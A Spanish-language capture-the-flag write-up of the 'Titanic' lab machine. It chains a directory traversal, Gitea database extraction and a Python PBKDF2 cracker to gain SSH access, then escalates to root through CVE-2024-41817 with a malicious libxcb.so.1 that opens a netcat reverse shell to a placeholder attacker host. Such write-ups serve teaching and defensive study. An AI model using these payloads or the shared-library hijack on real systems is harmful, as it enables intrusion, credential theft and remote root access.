Aplicación web Apache con una funcionalidad "Book a Trip" que devuelve archivos JSON nombrados como tickets vía un endpoint `/download?ticket=`, vulnerable a un directory traversal que filtra `/etc/passwd` y — combinado con un subdominio Gitea en `dev.titanic.htb` que revela una ruta de instalación personalizada — permite extraer la base de datos SQLite de Gitea. Un crackeador PBKDF2 a medida contra la fila `developer` da la contraseña SSH. Escalada de privilegios mediante **CVE-2024-41817** — un script tipo cron propiedad de root invoca ImageMagick desde un directorio escribible por `developer`, y el `RUNPATH` del binario `magick` permite que una `libxcb.so.1` hostil en ese directorio se cargue antes que la versión del sistema, ejecutando un constructor como root.

## Reconocimiento y enumeración

El objetivo de esta fase era enumerar los servicios expuestos e identificar el stack de aplicación que merecía la pena atacar.

### Escaneo de puertos

Un único escaneo combinado de Nmap cubrió todos los puertos TCP con los scripts por defecto y detección de versiones:

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.129.211.231 -oA nmap-out
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux
```

Dos puertos — SSH y HTTP — y una redirección a `titanic.htb` que señalaba virtual hosting basado en nombre. SSH se despriorizó al ser la versión de OpenSSH actual. El dominio se añadió al `/etc/hosts`:

```bash
echo "10.129.211.231 titanic.htb" | sudo tee -a /etc/hosts
```

### Aplicación web — la funcionalidad de reserva

El sitio es una página de marketing estática de una compañía de cruceros ficticia, con un único elemento interactivo: un botón "Book a Trip" que abre un modal aceptando nombre, apellido, email, teléfono y un destino. Rellenar el formulario y enviarlo disparó la descarga de un archivo JSON con los datos enviados — una elección de UX inusual que invitaba de inmediato a mirar más de cerca el intercambio HTTP.

Capturar el flujo en Burp Suite reveló un patrón de dos peticiones:

```http
POST /book HTTP/1.1
Host: titanic.htb
Content-Type: application/json

{"name":"test","surname":"test","email":"test@test.com","phone":"123","trip":"northern-lights"}
```

La respuesta devolvió un objeto JSON con un único campo útil:

```json
{"ticket":"a8f3c2e1-9d4b-4567-bcde-1234567890ab.json"}
```

El navegador entonces emitía un `GET /download?ticket=a8f3c2e1-9d4b-4567-bcde-1234567890ab.json` de seguimiento, que devolvía el archivo JSON. Dos decisiones de diseño lo hicieron explotable. Primera, el artefacto de reserva se almacena en disco y se recupera por nombre en lugar de servirse desde memoria. Segunda, el parámetro `ticket` es un nombre de archivo en lugar de un ID opaco — lo que significa que podría interpolarse directamente en una ruta del sistema de archivos.

### Directory traversal vía `/download?ticket=`

Reemplazar el valor del ticket con una secuencia de path traversal apuntando a un archivo conocido confirmó el bug:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
```

El endpoint lee `/etc/passwd` sin restricciones — un **directory traversal** de manual (a menudo llamado Local File Inclusion en este contexto). El usuario `developer` con una shell de login real destacaba como el objetivo obvio para cualquier credencial encontrada más adelante.

### Enumeración de subdominios

La app de titanic.htb no tenía nada más de interés, así que el siguiente movimiento era buscar vhosts hermanos. `ffuf` con fuzzing de la cabecera Host es el enfoque estándar: cada petición va a la misma IP pero con una cabecera `Host` distinta, y el tamaño de la respuesta o el código de estado diferencia los vhosts válidos del catch-all:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.titanic.htb" -u http://titanic.htb
```

Cada respuesta devolvía la misma longitud de cuerpo (10 líneas), que es la señal de "wildcard hit" de ffuf — el vhost principal captura cualquier cabecera Host. Filtrar por número de líneas `-fl 10` quitó el ruido:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -fl 10
dev                     [Status: 200, Size: ...]
```

Un vhost `dev` respondió con una página distinta. Añadido al `/etc/hosts`:

```bash
echo "10.129.211.231 dev.titanic.htb" | sudo tee -a /etc/hosts
```

### `dev.titanic.htb` — instancia de Gitea

Navegar a `http://dev.titanic.htb/` cargó una instancia de hosting de código **Gitea**. El usuario `developer` tenía dos repositorios públicos visibles en *Explore*:

- Una aplicación Flask (probablemente la fuente de la funcionalidad de reserva)
- Un repositorio `docker-config`

La app Flask era el sitio obvio donde buscar pistas sobre la funcionalidad de reserva, pero `docker-config` era más valioso para la escalada de privilegios — los archivos de Docker compose revelan rutinariamente montajes de volúmenes, variables de entorno, rutas de servicios y credenciales. Inspeccionarlo reveló la disposición en disco del propio servicio de Gitea:

```yaml
# extracto de docker-compose.yml
services:
  gitea:
    volumes:
      - /home/developer/gitea/data:/data
```

Este es el puente entre las dos mitades del ataque. El `/data` del contenedor de Gitea está montado desde `/home/developer/gitea/data` en el host — y el sistema de archivos del host es accesible a través del sumidero de traversal `/download?ticket=`.

## Explotación

### Localizando la configuración de la app de Gitea

Gitea almacena su configuración operativa en `app.ini`, que vive en el subdirectorio `conf/` de su directorio de trabajo. Las rutas canónicas para una instalación de Gitea son `/etc/gitea/app.ini` o `<WORK_DIR>/custom/conf/app.ini`. Dada la filtración de docker-config, el primer intento natural era la ruta de datos estándar:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/conf/app.ini"
# (vacío / error)
```

Eso falló. Gitea en esta máquina no usaba la disposición por defecto, lo que significaba que hacer fuerza bruta de la estructura de directorios bajo `/home/developer/gitea/data/` era el siguiente paso. `ffuf` de nuevo, esta vez contra el endpoint del LFI con fuzzing de extensiones para `.db` e `.ini`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/FUZZ" \
     -t 10 -e ".db,.ini"
git                     [Status: 200, Size: ...]
```

Un acierto: `git`. Profundizando:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/FUZZ" \
     -t 10 -e ".db,.ini"
.ssh                    [Status: 200, Size: ...]
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/.ssh/FUZZ" \
     -t 10 -e ".db,.ini"
environment             [Status: 200, Size: ...]
```

El archivo `.ssh/environment` dentro del home del usuario git es un artefacto específico de Gitea. Gitea usa una implementación del protocolo git basada en SSH donde los usuarios hacen push y pull como el usuario de sistema `git`; el archivo `environment` lo carga sshd en el momento del login y contiene las variables que le dicen a Gitea dónde vive su directorio de trabajo. Leerlo reveló la ruta real:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/git/.ssh/environment"
GITEA_WORK_DIR=/home/developer/gitea/data/gitea
[...]
```

El `WORK_DIR` es el directorio `gitea/` *hijo* bajo `/data/` — `/home/developer/gitea/data/gitea/`. Ese componente de ruta extra no tenía por qué estar ahí por convención, que es exactamente por lo que la suposición estándar falló.

### Extrayendo la base de datos de Gitea

Con la ruta correcta establecida, descargar `app.ini` fue un curl directo:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/conf/app.ini" > app.ini
grep -E "^(DB_TYPE|PATH)" app.ini
DB_TYPE  = sqlite3
PATH     = /data/gitea/gitea.db
```

Gitea usa SQLite en este despliegue — lo que significa que toda la tabla de usuarios está en un único archivo, y ese archivo es legible a través del mismo LFI:

```bash
curl -s "http://titanic.htb/download?ticket=../../../../../../home/developer/gitea/data/gitea/gitea.db" > gitea.db
```

Una consulta SQLite estándar contra la base de datos volcada extrajo la tabla de usuarios:

```bash
sqlite3 gitea.db
sqlite> SELECT id, name, passwd, salt, passwd_hash_algo FROM user;
1|administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b|pbkdf2$50000$50
2|developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34|pbkdf2$50000$50
```

La fila `developer` era el objetivo — ese nombre coincide con el usuario del sistema con shell de login descubierto antes. Dos piezas importan para el paso de crackeo:

```text
hash : e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
salt : 8bf3e3452b78544f8bee9400d6936d34
algo : pbkdf2$50000$50
```

La cadena `passwd_hash_algo` se parsea como **PBKDF2** con **50.000 iteraciones** y una **longitud de clave de salida de 50 bytes**.

### Crackeando PBKDF2-SHA256 con una longitud de clave no estándar

Hashcat sí soporta PBKDF2-HMAC-SHA256 (modo 10900), pero su expectativa por defecto para la longitud de clave derivada es de 32 bytes (el tamaño de salida natural de SHA-256). El parámetro de longitud de salida `$50` de Gitea lo lleva a 50 bytes, lo que no encaja en el modo canónico y requeriría o bien un tuneo personalizado de hashcat o herramientas hechas a mano.

Un script corto de Python era el camino más simple. `hashlib.pbkdf2_hmac` acepta un `dklen` explícito, así que la única lógica de bucle necesaria es iterar el diccionario y comparar las claves derivadas con el objetivo:

```python
import hashlib
import binascii
from pwn import log

# Parameters from gitea.db
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')
key = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'
dklen = 50
iterations = 50000


def hash(password, salt, iterations, dklen):
    return hashlib.pbkdf2_hmac(
        hash_name='sha256',
        password=password,
        salt=salt,
        iterations=iterations,
        dklen=dklen,
    )


dict = '/usr/share/wordlists/rockyou.txt'
bar = log.progress('Cracking PBKDF2')

with open(dict, 'r', encoding='utf-8') as f:
    for line in f:
        password = line.strip().encode('utf-8')
        hashValue = hash(password, salt, iterations, dklen)
        target = binascii.unhexlify(key)
        bar.status(f'Trying: {password}')
        if hashValue == target:
            bar.success(f'Found password: {password}!')
            break
```

Ejecutarlo contra rockyou llevó notablemente más tiempo que una pasada de crackeo típica — 50.000 iteraciones de SHA-256 por candidato es el objetivo entero del diseño de PBKDF2 — pero la contraseña acabó cayendo:

```bash
python3 -m venv cracker
source ./cracker/bin/activate
pip3 install pwn
python3 cracker.py
[+] Cracking PBKDF2: Found password: b'25282528'!
```

Contraseña recuperada: **`25282528`** — una contraseña numérica que resultó estar en rockyou pese a parecer por lo demás inadivinable. Es un patrón de repetición que ocurre con la frecuencia suficiente como para acabar en los diccionarios.

## Escalada de privilegios — `developer` → `root` (CVE-2024-41817)

Con una shell como `developer`, corrieron las comprobaciones estándar. `sudo -l` estaba vacío, `ps aux` no tenía nada obviamente interesante, y el directorio home contenía solo la flag de usuario. El avance llegó de `/opt`:

```bash
ls -la /opt
drwxr-xr-x  5 root root      4096 Feb  7 10:37 .
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
drwxr-xr-x  5 root developer 4096 Feb  7 10:37 app
drwx--x--x  4 root root      4096 Feb  7 10:37 containerd
drwxr-xr-x  2 root root      4096 Feb  7 10:37 scripts
```

Un directorio `scripts/` propiedad de root, y un directorio `app/` cuyo grupo es `developer` — lo que significa que el usuario actual puede escribir archivos dentro. La combinación es el montaje de la escalada.

```bash
cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

El script se mueve a `/opt/app/static/assets/images`, trunca `metadata.log` y ejecuta `magick identify` de ImageMagick contra cada `*.jpg` en ese directorio, añadiendo la salida a `metadata.log`. El script en sí es propiedad de root (`-rwxr-xr-x 1 root root`), y la forma en que se ejecuta periódicamente sin que `developer` lo invoque manualmente significa que hay un cron o un timer de systemd propiedad de root disparándolo.

Dos hechos estructurales lo hacen explotable:

- El script corre **como root** (de lo contrario no podría truncar un log propiedad de root).
- El script hace `cd` a un directorio **escribible por `developer`** y luego invoca un binario de `/usr/bin/`.

La combinación es la precondición para **CVE-2024-41817**, un fallo de carga de bibliotecas de ImageMagick en builds que vienen con un `RUNPATH` relativo o anclado a `$ORIGIN`. Cuando `magick` arranca, el linker dinámico recorre la ruta de búsqueda de bibliotecas buscando dependencias como `libxcb.so.1`. Debido al `RUNPATH` mal configurado, el directorio de trabajo actual (o rutas derivadas de él) se consulta antes que los directorios de bibliotecas del sistema — y si existe ahí un archivo llamado `libxcb.so.1`, se carga *como la biblioteca del sistema*. Cualquier código dentro de ese objeto compartido — incluida una función etiquetada con el `__attribute__((constructor))` de GCC — se ejecuta durante el `dlopen`, antes de que corra `main()`, con los privilegios que tenga el proceso llamante. Aquí, esos son root.

Disparar el bug es por tanto tres líneas de C y una invocación de `gcc`.

### Confirmando la versión vulnerable

```bash
magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
```

La versión 7.1.1-35 cae dentro del rango afectado por CVE-2024-41817. Confirmar que el script realmente corre periódicamente — y desde el directorio en el que developer puede escribir — fue una comprobación rápida: dejar un JPEG nuevo en el directorio de imágenes y esperar:

```bash
wget http://<ATTACKER_IP>/testImage.jpg
# ... esperar un minuto ...
cat /opt/app/static/assets/images/metadata.log
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 ...
/opt/app/static/assets/images/testImage.jpg JPEG 3440x1337 ...
```

La nueva entrada confirmó que el script corre en un intervalo corto (menos de un minuto) y opera sobre contenido proporcionado por el usuario en ese directorio.

### Construyendo el objeto compartido malicioso

Una fuente C mínima que define un constructor que dispara una reverse shell con netcat:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("busybox nc <ATTACKER_IP> 9001 -e /bin/bash");
    exit(0);
}
```

Unas notas sobre las elecciones. `__attribute__((constructor))` es el atributo de GCC que marca una función para que corra automáticamente cuando se carga el objeto compartido — antes de que se use ninguno de sus símbolos. Se usa `busybox nc` en lugar del `nc` a secas porque el `nc-openbsd` de Ubuntu no soporta `-e`, mientras que `busybox nc` (normalmente presente en instalaciones mínimas de Ubuntu) sí. El `exit(0)` tras lanzar la shell evita que ImageMagick continúe — sin él, el proceso padre seguiría intentando usar una libxcb que en realidad no exporta los símbolos esperados, probablemente petando de forma más ruidosa.

Compilado como una biblioteca compartida independiente de posición nombrada como la biblioteca del sistema que suplanta:

```bash
gcc -shared -fPIC -o libxcb.so.1 exploit.c
```

Se inició un listener de netcat en la máquina atacante:

```bash
sudo nc -lvnp 9001
listening on [any] 9001 ...
```

La `libxcb.so.1` compilada se colocó en `/opt/app/static/assets/images/` — el mismo directorio al que el script hace `cd` antes de invocar `magick`. En menos de un minuto, la siguiente ejecución programada de `identify_images.sh` cargó la biblioteca maliciosa, ejecutó el constructor, y el listener capturó la conexión de vuelta como root:

```bash
sudo nc -lvnp 9001
listening on [any] 9001 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.129.211.231] 57464
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

## Conclusiones clave

- **Los parámetros con nombre de archivo son culpables hasta que se demuestre lo contrario.** Cualquier parámetro HTTP cuyo nombre o valor parezca una ruta del sistema de archivos — `file`, `path`, `download`, `ticket`, `image`, `template` — debería ser lo primero que se prueba con secuencias `../`. El endpoint `/download?ticket=` de Titanic es la forma de manual: un valor tipo UUID que resulta estar interpolado directamente en una lectura del sistema de archivos.
- **La enumeración de subdominios pertenece a todo engagement de aplicación web.** Los dominios principales suelen alojar la página de marketing, pero la aplicación *interesante* — paneles de admin, herramientas internas, sistemas CI/CD, hosting de código — vive en `dev`, `staging`, `internal`, `git`, `ci`. El modo de vhost-fuzzing de ffuf es la herramienta correcta, y el filtro de respuesta wildcard (`-fl <N>` o `-fs <bytes>`) no es opcional porque las configuraciones catch-all ahogarían si no los hallazgos reales.
- **La filtración de configuración se potencia con los sumideros de directory traversal.** El bug de directory traversal por sí solo solo habría filtrado `/etc/passwd`. El repo `docker-config` de Gitea por sí solo solo habría documentado la disposición de los datos. Juntos, son una primitiva completa de extracción de base de datos — tienes que saber *qué* archivo pedir *y* dónde vive, y una vez que tienes ambos, el sumidero de traversal lo entrega.
- **PBKDF2 con un `dklen` no estándar vence a las herramientas de crackeo de serie.** Los modos estándar de hashcat asumen longitudes de salida canónicas (32 bytes para SHA-256). Los despliegues personalizados que sobreescriben `dklen` — la salida de 50 bytes de Gitea aquí es un ejemplo real — no encajan en esos modos de fábrica. Un bucle de 30 líneas en Python usando `hashlib.pbkdf2_hmac` funciona perfectamente para cualquier hash único, y la lentitud de PBKDF2 no importa mucho cuando el diccionario es finito. *Hashcat es la herramienta correcta cuando tienes diez mil hashes; Python es la herramienta correcta cuando tienes uno.*
- **El secuestro de bibliotecas compartidas sigue siendo una primitiva de escalada infravalorada.** CVE-2024-41817 es el último de una larga lista de bugs del tipo "el binario X busca la biblioteca Y en una ruta en la que el atacante puede escribir". La combinación de *script propiedad de root* + *CWD escribible por el atacante* + *binario con RPATH/RUNPATH mal configurado* debería marcarse como hallazgo crítico en cualquier revisión post-explotación, incluso cuando el binario en cuestión no sea conocido como vulnerable actualmente — la configuración por sí sola es el bug.
- **Los scripts periódicos de root que tocan directorios influidos por el atacante son una invitación abierta.** El diseño de `identify_images.sh` — root procesando archivos controlados por el usuario desde un directorio escribible — es estructuralmente poco sólido independientemente del binario que use. Incluso sin el problema del RUNPATH de ImageMagick, la dependencia del script de `xargs` con nombres de archivo sensibles a meta-caracteres de shell habría sido explotable mediante una elaboración astuta de nombres de archivo. La solución es ejecutar tales tareas como un usuario dedicado de bajos privilegios y canalizar los resultados a través de un canal no privilegiado.
